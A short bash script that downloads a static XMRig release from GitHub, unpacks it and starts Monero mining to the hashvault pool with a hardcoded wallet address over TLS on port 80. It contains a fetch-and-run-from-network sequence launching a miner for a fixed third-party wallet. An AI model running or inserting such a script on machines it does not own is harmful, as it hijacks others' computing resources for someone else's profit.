#!/bin/bash
mkdir -p tara
cd tara
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
cd xmrig-6.22.2
chmod +x xmrig
./xmrig --url pool.hashvault.pro:80 --user 4A7LbBSLieSHkQYZCG7tyWDi8Hm8FYGHdEkxWybesWf7NXn5PBziJ622Bwr4q9rQkK4qvnN63djtnDQYjMgnWU43CyFbQWm --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14